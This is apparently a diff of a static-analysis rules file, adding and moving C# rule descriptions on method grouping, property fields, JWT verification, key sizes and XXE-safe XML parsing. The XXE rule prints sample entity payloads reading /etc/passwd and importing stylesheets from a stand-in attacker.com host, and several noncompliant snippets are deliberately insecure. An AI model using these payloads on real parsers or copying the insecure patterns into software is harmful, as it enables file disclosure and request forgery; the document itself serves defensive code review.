@@ -308,6 +308,56 @@ CODE_SMELL
   <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
 </ul>Z
 CODE_SMELL
+«
+
+csharpsquid:S4136±
+
+csharpsquidS4136+Method overloads should be grouped together"MINOR*cs:÷	<p>For clarity, all overloads of the same method should be grouped together. That lets both users and maintainers quickly understand all the current
+available options.</p>
+<h2>Noncompliant Code Example</h2>
+<pre>
+interface IMyInterface
+{
+  int DoTheThing(); // Noncompliant - overloaded method declarations are not grouped together
+  string DoTheOtherThing();
+  int DoTheThing(string s);
+}
+</pre>
+<h2>Compliant Solution</h2>
+<pre>
+interface IMyInterface
+{
+  int DoTheThing();
+  int DoTheThing(string s);
+  string DoTheOtherThing();
+}
+</pre>
+<h2>Exceptions</h2>
+<p>As it is common practice to group method declarations by implemented interface, no issue will be raised for implicit and explicit interface
+implementations if grouped together with other members of that interface.</p>
+<p>As it is also a common practice to group method declarations by accessibility level, no issue will be raised for method overloads having different
+access modifiers.</p>
+<p>Example:</p>
+<pre>
+class MyClass
+{
+  private void DoTheThing(string s) // Ok - this method is declared as private while the other one is public
+  {
+    // ...
+  }
+
+  private string DoTheOtherThing(string s)
+  {
+    // ...
+  }
+
+  public void DoTheThing()
+  {
+    // ...
+  }
+}
+</pre>Z
+CODE_SMELL
 Í
 	php:S1131‹
 phpS1131.Lines should not end with trailing whitespaces"MINOR*php:Ö<p>Trailing whitespaces are simply useless and should not stay in code. They may generate noise when comparing different versions of the same
@@ -9541,52 +9591,6 @@ namespace myLib
     const int x = 1;
     const int y = x + 4;
     const string s = "Bar";
-  }
-}
-</pre>Z
-CODE_SMELL
-Í
-csharpsquid:S4136‘
-csharpsquidS4136+Method overloads should be grouped together"MINOR*cs:˘<p>For clarity, all overloads of the same method should be grouped together. That lets both users and maintainers quickly understand all the current
-available options.</p>
-<h2>Noncompliant Code Example</h2>
-<pre>
-interface IMyInterface
-{
-  int DoTheThing(); // Noncompliant - overloaded method declarations are not grouped together
-  string DoTheOtherThing();
-  int DoTheThing(string s);
-}
-</pre>
-<h2>Compliant Solution</h2>
-<pre>
-interface IMyInterface
-{
-  int DoTheThing();
-  int DoTheThing(string s);
-  string DoTheOtherThing();
-}
-</pre>
-<h2>Exceptions</h2>
-<p>As it is also a common practice to group method declarations by accessibility level, no issue will be raised for method overloads having different
-access modifiers.</p>
-<p>Example:</p>
-<pre>
-class MyClass
-{
-  private void DoTheThing(string s) // Ok - this method is declared as private while the other one is public
-  {
-    // ...
-  }
-
-  private string DoTheOtherThing(string s)
-  {
-    // ...
-  }
-
-  public void DoTheThing()
-  {
-    // ...
   }
 }
 </pre>Z
@@ -42526,6 +42530,93 @@ a::before {
 ...
 }
 </pre>ZBUG
+æ
+csharpsquid:S5659®
+csharpsquidS5659?JWT should be signed and verified with strong cipher algorithms"CRITICAL*cs:≥
+<p>If a JWT is not signed with a strong cipher algorithm (or not signed at all) an attacker can forge it and impersonate user identities.</p>
+<ul>
+  <li> Don't use <code>none</code> algorithm to sign or verify the validity of an algorithm. </li>
+  <li> Don't use a token without before verifying the signature. </li>
+</ul>
+<h2>Noncompliant Code Example</h2>
+<p><a href="https://github.com/jwt-dotnet/jwt">jwt-dotnet</a> library:</p>
+<pre>
+var decodedtoken1 = decoder.Decode(token, secret, verify: false); // Noncompliant: signature should be verified
+
+var decodedtoken2 = new JwtBuilder()
+   .WithSecret(secret)
+   .Decode(forgedtoken1); // Noncompliant: signature should be verified
+</pre>
+<h2>Compliant Solution</h2>
+<p><a href="https://github.com/jwt-dotnet/jwt">jwt-dotnet</a> library:</p>
+<pre>
+var decodedtoken1 = decoder.Decode(forgedtoken1, secret, verify: true); // Compliant
+
+var decodedtoken2 = new JwtBuilder()
+   .WithSecret(secret)
+   .MustVerifySignature()
+   .Decode(token); // Compliant
+</pre>
+<h2>See</h2>
+<ul>
+  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
+  </li>
+  <li> <a href="https://cwe.mitre.org/data/definitions/347.html">MITRE, CWE-347</a> - Improper Verification of Cryptographic Signature </li>
+</ul>ZVULNERABILITY
+°
+csharpsquid:S4275ã
+csharpsquidS42755Getters and setters should access the expected fields"CRITICAL*cs:™<p>Properties provide a way to enforce encapsulation by providing <code>public</code>, <code>protected</code> or <code>internal</code> methods that
+give controlled access to <code>private</code> fields. However in classes with multiple fields it is not unusual that cut and paste is used to quickly
+create the needed properties, which can result in the wrong field being accessed by a getter or setter.</p>
+<p>This rule raises an issue in any of these cases:</p>
+<ul>
+  <li> A setter does not update the field with the corresponding name. </li>
+  <li> A getter does not access the field with the corresponding name. </li>
+</ul>
+<p>For simple properties it is better to use <a
+href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/classes-and-structs/auto-implemented-properties">auto-implemented
+properties</a> (C# 3.0 or later).</p>
+<p>Field and property names are compared as case-insensitive. All underscore characters are ignored.</p>
+<h2>Noncompliant Code Example</h2>
+<pre>
+class A
+{
+    private int x;
+    private int y;
+
+    public int X
+    {
+        get { return x; }
+        set { x = value; }
+    }
+
+    public int Y
+    {
+        get { return x; }  // Noncompliant: field 'y' is not used in the return value
+        set { x = value; } // Noncompliant: field 'y' is not updated
+    }
+}
+</pre>
+<h2>Compliant Solution</h2>
+<pre>
+class A
+{
+    private int x;
+    private int y;
+
+    public int X
+    {
+        get { return x; }
+        set { x = value; }
+    }
+
+    public int Y
+    {
+        get { return y; }
+        set { y = value; }
+    }
+}
+</pre>ZBUG
 ò
 	php:S4524ä
 phpS4524)"default" clauses should be first or last"CRITICAL*php:µ<p><code>switch</code> can contain a <code>default</code> clause for various reasons: to handle unexpected values, to show that all the cases were
@@ -48817,59 +48908,6 @@ public class Program
     }
 }
 </pre>ZBUG
-∏
-csharpsquid:S4275¢
-csharpsquidS42755Getters and setters should access the expected fields"CRITICAL*cs:¡<p>Properties provide a way to enforce encapsulation by providing <code>public</code>, <code>protected</code> or <code>internal</code> methods that
-give controlled access to <code>private</code> fields. However in classes with multiple fields it is not unusual that cut and paste is used to quickly
-create the needed properties, which can result in the wrong field being accessed by a getter or setter.</p>
-<p>This rule raises an issue in any of these cases:</p>
-<ul>
-  <li> A setter does not update the field with the corresponding name. </li>
-  <li> A getter does not access the field with the corresponding name. </li>
-</ul>
-<p>For simple properties it is better to use <a
-href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/classes-and-structs/auto-implemented-properties">auto-implemented
-properties</a> (C# 3.0 or later).</p>
-<h2>Noncompliant Code Example</h2>
-<pre>
-class A
-{
-    private int x;
-    private int y;
-
-    public int X
-    {
-        get { return x; }
-        set { x = value; }
-    }
-
-    public int Y
-    {
-        get { return x; }  // Noncompliant: field 'y' is not used in the return value
-        set { x = value; } // Noncompliant: field 'y' is not updated
-    }
-}
-</pre>
-<h2>Compliant Solution</h2>
-<pre>
-class A
-{
-    private int x;
-    private int y;
-
-    public int X
-    {
-        get { return x; }
-        set { x = value; }
-    }
-
-    public int Y
-    {
-        get { return y; }
-        set { y = value; }
-    }
-}
-</pre>ZBUG
 ¶
 	xml:S1778ò
 xmlS1778IXML files containing a prolog header should start with "<?xml" characters"CRITICAL*xml:™<p>The prolog header is the following piece of code that some XML documents start with:</p>
@@ -52516,6 +52554,245 @@ input {}
 
 ul li {}
 </pre>ZBUG
+œ
+csharpsquid:S4426π
+csharpsquidS4426#Cryptographic keys should be robust"BLOCKER*cs:·<p>Most of cryptographic systems require a sufficient key size to be robust against brute-force attacks.</p>
+<p><a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar2.pdf">NIST recommendations</a> will be checked for these
+use-cases:</p>
+<p><strong>Digital Signature Generation</strong> and <strong>Verification:</strong> </p>
+<ul>
+  <li> p ‚â• 2048 AND q ‚â• 224 for DSA (<code>p</code> is key length and <code>q</code> the modulus length) </li>
+  <li> n ‚â• 2048 for RSA (<code>n</code> is the key length) </li>
+</ul>
+<p><strong>Key Agreement</strong>: </p>
+<ul>
+  <li> p ‚â• 2048 AND q ‚â• 224 for DH and MQV </li>
+  <li> n ‚â• 224 for ECDH and ECMQV (Examples: <code>secp192r1</code> is a non-compliant curve (<code>n</code> &lt; 224) but <code>secp224k1</code> is
+  compliant (<code>n</code> &gt;= 224)) </li>
+</ul>
+<p><strong>Encryption and Decryption</strong>: </p>
+<ul>
+  <li> AES-128, 192, 256 </li>
+</ul>
+<p>This rule will not raise issues for ciphers that are considered weak (no matter the key size) like <code>DES</code>, <code>Blowfish</code>.</p>
+<h2>Noncompliant Code Example</h2>
+<pre>
+using System;
+using System.Security.Cryptography;
+
+namespace MyLibrary
+{
+    public class MyCryptoClass
+    {
+        static void Main()
+        {
+            var dsa1 = new DSACryptoServiceProvider(); // Noncompliant - default key size is 1024
+            dsa1.KeySize = 2048; // Noncompliant - the setter does not update the underlying key size for the DSACryptoServiceProvider class
+
+            var dsa2 = new DSACryptoServiceProvider(2048); // Noncompliant - cannot create DSACryptoServiceProvider with a key size bigger than 1024
+
+            var rsa1 = new RSACryptoServiceProvider(); // Noncompliant - default key size is 1024
+            rsa1.KeySize = 2048; // Noncompliant - the setter does not update the underlying key size for the RSACryptoServiceProvider class
+
+            var rsa2 = new RSACng(1024); // Noncompliant
+
+            // ...
+        }
+    }
+}
+</pre>
+<p>KeySize property of DSACryptoServiceProvider and RSACryptoServiceProvider does not change the value of underlying KeySize for the algorithm.
+Property setter is ignored without error and KeySize can be changed only by using constructor overload. See:</p>
+<ul>
+  <li> <a
+  href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.dsacryptoserviceprovider.keysize">DSACryptoServiceProvider.KeySize
+  Property</a> </li>
+  <li> <a
+  href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.rsacryptoserviceprovider.keysize">RSACryptoServiceProvider.KeySize
+  Property</a> </li>
+</ul>
+<h2>Compliant Solution</h2>
+<pre>
+using System;
+using System.Security.Cryptography;
+
+namespace MyLibrary
+{
+    public class MyCryptoClass
+    {
+        static void Main()
+        {
+            var dsa1 = new DSACng(); // Compliant - default key size is 2048
+            var dsa2 = new DSACng(2048); // Compliant
+            var rsa1 = new RSACryptoServiceProvider(2048); // Compliant
+            var rsa2 = new RSACng(); // Compliant - default key size is 2048
+
+            // ...
+        }
+    }
+}
+</pre>
+<h2>See</h2>
+<ul>
+  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
+  </li>
+  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A9</a> - Security
+  Misconfiguration </li>
+  <li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST 800-131A</a> - Recommendation for Transitioning the
+  Use of Cryptographic Algorithms and Key Lengths </li>
+  <li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
+</ul>ZVULNERABILITY
+à0
+csharpsquid:S2755Ú/
+csharpsquidS27553XML parsers should not be vulnerable to XXE attacks"BLOCKER*cs:ä/<p><a href="https://www.w3.org/TR/xml/">XML specification</a> allows the use of entities that can be <a
+href="https://www.w3.org/TR/xml/#sec-internal-ent">internal</a> or <a href="https://www.w3.org/TR/xml/#sec-external-ent">external</a> (file system /
+network access ...).</p>
+<p>Allowing access to external entities in XML parsing could lead to vulnerabilities like confidential file disclosures or <a
+href="https://www.owasp.org/index.php/Server_Side_Request_Forgery">SSRFs</a>:</p>
+<p>Example in XML document:</p>
+<pre>
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+  &lt;!DOCTYPE test [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+  ]&gt;
+&lt;note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.attacking.com/deleteall"&gt;
+  &lt;to&gt;&amp;xxe;&lt;/to&gt;
+  &lt;from&gt;Jani&lt;/from&gt;
+  &lt;heading&gt;Reminder&lt;/heading&gt;
+  &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;
+&lt;/note&gt;
+</pre>
+<p>Example in XSL document:</p>
+<pre>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY content SYSTEM "file:/etc/passwd"&gt;
+]&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+  &lt;xsl:import href="http://www.attacker.com/evil.xsl"/&gt;
+  &lt;xsl:include href="http://www.attacker.com/evil.xsl"/&gt;
+ &lt;xsl:template match="/"&gt;
+  &amp;content;
+ &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</pre>
+<p>Example in XSD document:</p>
+<pre>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE schema PUBLIC "-//W3C//DTD XMLSchema 200102//EN" "" [
+   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+  ]&gt;
+&lt;xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"&gt;
+  &lt;xs:import namespace="test" schemaLocation="http://www.attacker.com/evil.xsd"/&gt;
+  &lt;xs:element name="note"&gt;
+    &lt;xs:complexType&gt;
+      &lt;xs:sequence&gt;
+        &lt;xs:element name="to" type="xs:string"/&gt;
+        &lt;xs:element name="from" type="xs:string"/&gt;
+        &lt;xs:element name="heading" type="xs:string"/&gt;
+        &lt;xs:element name="body" type="xs:string"/&gt;
+      &lt;/xs:sequence&gt;
+    &lt;/xs:complexType&gt;
+  &lt;/xs:element&gt;
+&lt;/xs:schema&gt;
+</pre>
+<p>It is recommended to disable access to external entities.</p>
+<h2>Noncompliant Code Examples</h2>
+<p>System.Xml.XmlDocument</p>
+<pre>
+// .NET Framework &lt; 4.5.2
+XmlDocument parser = new XmlDocument(); // Noncompliant: XmlDocument is not safe by default
+parser.LoadXml("xxe.xml");
+
+or
+
+// .NET Framework 4.5.2+
+XmlDocument parser = new XmlDocument();
+parser.XmlResolver = new XmlUrlResolver(); // Noncompliant: XmlDocument.XmlResolver configured with XmlUrlResolver that makes it unsafe
+parser.LoadXml("xxe.xml");
+</pre>
+<p>System.Xml.XmlTextReader</p>
+<pre>
+// .NET Framework &lt; 4.5.2
+XmlTextReader reader = new XmlTextReader("xxe.xml"); // Noncompliant: XmlTextReady is not safe by default
+while (reader.Read())
+{ ... }
+
+or
+
+// .NET Framework 4.5.2+
+XmlTextReader reader = new XmlTextReader("xxe.xml");
+reader.XmlResolver = new XmlUrlResolver(); // Noncompliant: XmlTextRead.XmlResolver configured with XmlUrlResolver that makes it unsafe
+while (reader.Read())
+{ ... }
+</pre>
+<p>System.Xml.XmlReader</p>
+<pre>
+// .NET Framework 4.5.2+
+XmlReaderSettings settings = new XmlReaderSettings();
+settings.DtdProcessing = DtdProcessing.Parse;
+settings.XmlResolver = new XmlUrlResolver();
+XmlReader reader = XmlReader.Create("xxe.xml", settings); // Noncompliant: XmlReader is safe by default and becomes unsafe if DtdProcessing = Parse and XmlResolver is not null
+while (reader.Read())
+{ ... }
+</pre>
+<p>System.Xml.XPath.XPathDocument</p>
+<pre>
+// prior to .NET 4.5.2
+XPathDocument doc = new XPathDocument("example.xml"); // Noncompliant
+XPathNavigator nav = doc.CreateNavigator();
+string xml = nav.InnerXml.ToString();
+</pre>
+<h2>Compliant Solution</h2>
+<p>System.Xml.XmlDocument</p>
+<pre>
+XmlDocument parser = new XmlDocument();
+parser.XmlResolver = null; // Compliant: XmlResolver has been set to null
+parser.LoadXml("xxe.xml");
+
+or
+
+XmlDocument parser = new XmlDocument(); // Compliant: XmlDocument is safe by default in  .NET Framework 4.5.2+ because XmlResolver is set by default to null
+parser.LoadXml("xxe.xml");
+</pre>
+<p>System.Xml.XmlTextReader</p>
+<pre>
+// .NET 4.5.2+
+XmlTextReader reader = new XmlTextReader("xxe.xml"); // Compliant: XmlTextReader is safe by default in  .NET Framework 4.5.2+ because XmlResolver is set by default to null
+while (reader.Read())
+{ ... }
+
+// .NET 4.0 to .NET 4.5.1
+XmlTextReader reader = new XmlTextReader("xxe.xml");
+reader.DtdProcessing = DtdProcessing.Prohibit; // Compliant: XmlTextReader is safe by default in  .NET Framework 4.5.2+ because XmlResolver is set by default to null
+
+// &lt; .NET 4.0
+XmlTextReader reader = new XmlTextReader(stream);
+reader.ProhibitDtd = true; // Compliant: default is false
+</pre>
+<p>System.Xml.XmlReader</p>
+<pre>
+XmlReader reader = XmlReader.Create("xxe.xml"); // Compliant: XmlReader is safe by default
+while (reader.Read())
+{ ... }
+</pre>
+<p>System.Xml.XPath.XPathDocument</p>
+<pre>
+// prior to .NET 4.5.2
+XmlReader reader = XmlReader.Create("example.xml");
+XPathDocument doc = new XPathDocument(reader); // Compliant: XPathDocument is safe when being given a safe XmlReader
+XPathNavigator nav = doc.CreateNavigator();
+string xml = nav.InnerXml.ToString();
+</pre>
+<h2>See</h2>
+<ul>
+  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)">OWASP Top 10 2017 Category A4</a> - XML External Entities
+  (XXE) </li>
+  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#net">OWASP XXE Prevention Cheat
+  Sheet</a> </li>
+  <li> <a href="http://cwe.mitre.org/data/definitions/611.html">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li>
+  <li> <a href="http://cwe.mitre.org/data/definitions/827.html">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li>
+</ul>ZVULNERABILITY
 û
 	php:S2115ê
 phpS2115&Databases should be password-protected"BLOCKER*php:º
@@ -55155,58 +55432,6 @@ public class Program
 }
 </pre>Z
 CODE_SMELL
-°
-csharpsquid:S4426ã
-csharpsquidS4426#Cryptographic keys should be robust"BLOCKER*cs:≥<p>When generating cryptograpic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force attacks. For
-the RSA algorithm the key should be at </p>
-<p> least 2048 bits long.</p>
-<p>This rule raises an issue when a RSA key-pair generator is initialized with too small a length parameter.</p>
-<h2>Noncompliant Code Example</h2>
-<pre>
-using System;
-using System.Security.Cryptography;
-
-namespace MyLibrary
-{
-    public class MyCryptoClass
-    {
-        static void Main()
-        {
-            RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(1024); // Noncompliant
-            // ...
-        }
-    }
-}
-</pre>
-<h2>Compliant Solution</h2>
-<pre>
-using System;
-using System.Security.Cryptography;
-
-namespace MyLibrary
-{
-    public class MyCryptoClass
-    {
-        static void Main()
-        {
-            RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(2048);
-            // ...
-        }
-    }
-}
-</pre>
-<h2>See</h2>
-<ul>
-  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
-  </li>
-  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A9</a> - Security
-  Misconfiguration </li>
-  <li> <a href="https://www.ssi.gouv.fr/uploads/2014/11/RGS_v-2-0_B1.pdf">ANSSI RGSv2</a> - R√©f√©rentiel G√©n√©ral de S√©curit√© version 2 </li>
-  <li> <a href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.186-4.pdf">NIST FIPS 186-4</a> - Digital Signature Standard (DSS) </li>
-  <li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
-  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#BLOWFISH_KEY_SIZE">BLOWFISH_KEY_SIZE</a> </li>
-  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#RSA_KEY_SIZE">RSA_KEY_SIZE</a> </li>
-</ul>ZVULNERABILITY
 ä
 csharpsquid:S3693Ù
 csharpsquidS36932Exception constructors should not throw exceptions"BLOCKER*cs:ó<p>It may be a good idea to raise an exception in a constructor if you're unable to fully flesh the object in question, but not in an
@@ -55472,126 +55697,6 @@ public class SomeOtherClassTest
   </li>
 </ul>Z
 CODE_SMELL
-û'
-csharpsquid:S2755à'
-csharpsquidS27553XML parsers should not be vulnerable to XXE attacks"BLOCKER*cs:†&<p><a href="https://www.w3.org/TR/xml/">XML specification</a> allows the use of entities that can be <a
-href="https://www.w3.org/TR/xml/#sec-internal-ent">internal</a> or <a href="https://www.w3.org/TR/xml/#sec-external-ent">external</a> (file system /
-network access ...).</p>
-<p>Allowing access to external entities in XML parsing could lead to vulnerabilities like confidential file disclosures or <a
-href="https://www.owasp.org/index.php/Server_Side_Request_Forgery">SSRFs</a>:</p>
-<p>Example in XML document:</p>
-<pre>
-&lt;?xml version="1.0" encoding="utf-8"?&gt;
-  &lt;!DOCTYPE test [
-    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
-  ]&gt;
-&lt;note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.attacking.com/deleteall"&gt;
-  &lt;to&gt;&amp;xxe;&lt;/to&gt;
-  &lt;from&gt;Jani&lt;/from&gt;
-  &lt;heading&gt;Reminder&lt;/heading&gt;
-  &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;
-&lt;/note&gt;
-</pre>
-<p>Example in XSL document:</p>
-<pre>
-&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE root [
-  &lt;!ENTITY content SYSTEM "file:/etc/passwd"&gt;
-]&gt;
-&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
-  &lt;xsl:import href="http://www.attacker.com/evil.xsl"/&gt;
-  &lt;xsl:include href="http://www.attacker.com/evil.xsl"/&gt;
- &lt;xsl:template match="/"&gt;
-  &amp;content;
- &lt;/xsl:template&gt;
-&lt;/xsl:stylesheet&gt;
-</pre>
-<p>Example in XSD document:</p>
-<pre>
-&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE schema PUBLIC "-//W3C//DTD XMLSchema 200102//EN" "" [
-   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
-  ]&gt;
-&lt;xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"&gt;
-  &lt;xs:import namespace="test" schemaLocation="http://www.attacker.com/evil.xsd"/&gt;
-  &lt;xs:element name="note"&gt;
-    &lt;xs:complexType&gt;
-      &lt;xs:sequence&gt;
-        &lt;xs:element name="to" type="xs:string"/&gt;
-        &lt;xs:element name="from" type="xs:string"/&gt;
-        &lt;xs:element name="heading" type="xs:string"/&gt;
-        &lt;xs:element name="body" type="xs:string"/&gt;
-      &lt;/xs:sequence&gt;
-    &lt;/xs:complexType&gt;
-  &lt;/xs:element&gt;
-&lt;/xs:schema&gt;
-</pre>
-<p>It is recommended to disable access to external entities.</p>
-<h2>Noncompliant Code Examples</h2>
-<p>System.Xml.XmlDocument</p>
-<pre>
-// .NET Framework &lt; 4.5.2
-XmlDocument parser = new XmlDocument(); // Noncompliant: XmlDocument is not safe by default
-parser.LoadXml("xxe.xml");
-
-or
-
-// .NET Framework 4.5.2+
-XmlDocument parser = new XmlDocument();
-parser.XmlResolver = new XmlUrlResolver(); // Noncompliant: XmlDocument.XmlResolver configured with XmlUrlResolver that makes it unsafe
-parser.LoadXml("xxe.xml");
-</pre>
-<p>System.Xml.XmlTextReader</p>
-<pre>
-// .NET Framework &lt; 4.5.2
-XmlTextReader reader = new XmlTextReader("xxe.xml"); // Noncompliant: XmlTextReady is not safe by default
-while (reader.Read())
-{ ... }
-
-or
-
-// .NET Framework 4.5.2+
-XmlTextReader reader = new XmlTextReader("xxe.xml");
-reader.XmlResolver = new XmlUrlResolver(); // Noncompliant: XmlTextRead.XmlResolver configured with XmlUrlResolver that makes it unsafe
-while (reader.Read())
-{ ... }
-</pre>
-<h2>Compliant Solution</h2>
-<p>System.Xml.XmlDocument</p>
-<pre>
-XmlDocument parser = new XmlDocument();
-parser.XmlResolver = null; // Compliant: XmlResolver has been set to null
-parser.LoadXml("xxe.xml");
-
-or
-
-XmlDocument parser = new XmlDocument(); // Compliant: XmlDocument is safe by default in  .NET Framework 4.5.2+ because XmlResolver is set by default to null
-parser.LoadXml("xxe.xml");
-</pre>
-<p>System.Xml.XmlTextReader</p>
-<pre>
-// .NET 4.5.2+
-XmlTextReader reader = new XmlTextReader("xxe.xml"); // Compliant: XmlTextReader is safe by default in  .NET Framework 4.5.2+ because XmlResolver is set by default to null
-while (reader.Read())
-{ ... }
-
-// .NET 4.0 to .NET 4.5.1
-XmlTextReader reader = new XmlTextReader("xxe.xml");
-reader.DtdProcessing = DtdProcessing.Prohibit; // Compliant: XmlTextReader is safe by default in  .NET Framework 4.5.2+ because XmlResolver is set by default to null
-
-// &lt; .NET 4.0
-XmlTextReader reader = new XmlTextReader(stream);
-reader.ProhibitDtd = true; // Compliant: default is false
-</pre>
-<h2>See</h2>
-<ul>
-  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)">OWASP Top 10 2017 Category A4</a> - XML External Entities
-  (XXE) </li>
-  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#net">OWASP XXE Prevention Cheat
-  Sheet</a> </li>
-  <li> <a href="http://cwe.mitre.org/data/definitions/611.html">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li>
-  <li> <a href="http://cwe.mitre.org/data/definitions/827.html">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li>
-</ul>ZVULNERABILITY
 Õ
 csharpsquid:S2190∑
 csharpsquidS2190 Recursion should not be infinite"BLOCKER*cs:Ï<p>Recursion happens when control enters a loop that has no exit. This can happen a method invokes itself, when a pair of methods invoke each other,
